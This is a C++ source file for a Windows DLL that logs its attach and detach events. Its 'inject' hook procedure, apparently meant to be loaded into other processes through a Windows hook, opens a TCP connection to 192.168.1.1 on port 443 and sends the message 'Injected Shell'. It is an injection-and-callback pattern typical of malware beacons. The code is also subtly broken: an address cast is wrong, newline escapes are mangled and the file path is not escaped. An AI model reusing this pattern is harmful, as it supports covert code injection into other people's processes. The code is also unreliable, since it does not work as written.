// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include<stdio.h>
//#include <WS2tcpip.h>
#include<winsock2.h>

#include<windows.h>


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	FILE *File;
	fopen_s(&File, "H:\mycode\Prepare\SetWindowsDll", "a+");

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		fprintf(File, "DLL attach function called.n");
		break;
	case DLL_PROCESS_DETACH:
		fprintf(File, "DLL detach function called.n");
		break;
	case DLL_THREAD_ATTACH:
		fprintf(File, "DLL thread attach function called.n");
		break;
	case DLL_THREAD_DETACH:
		fprintf(File, "DLL thread detach function called.n");
		break;
	}
	fclose(File);
	return TRUE;
}

int inject(int code, WPARAM wParam, LPARAM lParam)
{

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char *message;

	printf("\nInitializing Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return(CallNextHookEx(NULL, code, wParam, lParam));
	}

	printf("Initialized. \n");

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}

	printf("Socket Created. \n");

	 inet_pton(AF_INET,"192.168.1.1", (PVOID)server.sin_addr.s_addr); //ip address
	server.sin_family = AF_INET;
	server.sin_port = htons(443);

	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		return(CallNextHookEx(NULL, code, wParam, lParam));
	}

	puts("Connected");

	message = "Injected Shell";
	if (send(s, message, strlen(message), 0) <0)
	{
		puts("Send failed");
		return(CallNextHookEx(NULL, code, wParam, lParam));
	}
	puts("Data sent\n");

	return(CallNextHookEx(NULL, code, wParam, lParam));

}